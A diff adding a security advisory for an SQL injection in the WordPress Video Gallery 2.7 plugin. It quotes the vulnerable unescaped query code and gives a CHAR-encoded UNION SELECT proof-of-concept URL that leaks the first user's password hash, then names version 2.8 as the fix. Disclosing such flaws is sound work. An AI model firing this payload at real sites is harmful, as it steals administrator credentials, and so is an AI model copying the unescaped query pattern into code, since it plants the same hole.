@@ -1,0 +1,37 @@
+# Exploit Title: WordPress Video Gallery 2.7 SQL Injection
+# Date: 20-01-2015
+# Software Link: https://wordpress.org/plugins/contus-video-gallery/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+
+1. Description
+  
+$_GET['vid'] is not escaped.
+
+google_adsense() is accessible for everyone.
+
+File: contus-video-gallery\hdflvvideoshare.php
+
+add_action('wp_ajax_googleadsense' ,'google_adsense');
+add_action('wp_ajax_nonpriv_googleadsense' ,'google_adsense');
+function google_adsense(){
+	global $wpdb;
+	$vid = $_GET['vid'];
+	$google_adsense_id =  $wpdb->get_var('SELECT google_adsense_value FROM '.$wpdb->prefix.'hdflvvideoshare WHERE vid ='.$vid);
+	$query = $wpdb->get_var('SELECT googleadsense_details FROM '.$wpdb->prefix.'hdflvvideoshare_vgoogleadsense WHERE id='.$google_adsense_id);
+	$google_adsense = unserialize($query);
+	echo $google_adsense['googleadsense_code'];
+	die();
+}
+
+http://security.szurek.pl/wordpress-video-gallery-27-sql-injection.html
+
+2. Proof of Concept
+
+http://wordpress-url/wp-admin/admin-ajax.php?action=googleadsense&vid=0 UNION SELECT CAST(CHAR(48, 32, 85, 78, 73, 79, 78, 32, 83, 69, 76, 69, 67, 84, 32, 67, 79, 78, 67, 65, 84, 40, 67, 65, 83, 84, 40, 67, 72, 65, 82, 40, 57, 55, 44, 32, 53, 56, 44, 32, 52, 57, 44, 32, 53, 56, 44, 32, 49, 50, 51, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 57, 44, 32, 53, 54, 44, 32, 53, 56, 44, 32, 51, 52, 44, 32, 49, 48, 51, 44, 32, 49, 49, 49, 44, 32, 49, 49, 49, 44, 32, 49, 48, 51, 44, 32, 49, 48, 56, 44, 32, 49, 48, 49, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 49, 49, 53, 44, 32, 49, 48, 49, 44, 32, 49, 49, 48, 44, 32, 49, 49, 53, 44, 32, 49, 48, 49, 44, 32, 57, 53, 44, 32, 57, 57, 44, 32, 49, 49, 49, 44, 32, 49, 48, 48, 44, 32, 49, 48, 49, 44, 32, 51, 52, 44, 32, 53, 57, 44, 32, 49, 49, 53, 44, 32, 53, 56, 41, 32, 97, 115, 32, 67, 72, 65, 82, 41, 44, 32, 76, 69, 78, 71, 84, 72, 40, 117, 115, 101, 114, 95, 112, 97, 115, 115, 41, 44, 32, 67, 65, 83, 84, 40, 67, 72, 65, 82, 40, 53, 56, 44, 32, 51, 52, 41, 32, 97, 115, 32, 67, 72, 65, 82, 41, 44, 32, 117, 115, 101, 114, 95, 112, 97, 115, 115, 44, 32, 67, 65, 83, 84, 40, 67, 72, 65, 82, 40, 51, 52, 44, 32, 53, 57, 44, 32, 49, 50, 53, 41, 32, 97, 115, 32, 67, 72, 65, 82, 41, 41, 32, 70, 82, 79, 77, 32, 119, 112, 95, 117, 115, 101, 114, 115, 32, 87, 72, 69, 82, 69, 32, 73, 68, 32, 61, 32, 49) as CHAR)
+  
+3. Solution:
+  
+Update to version 2.8
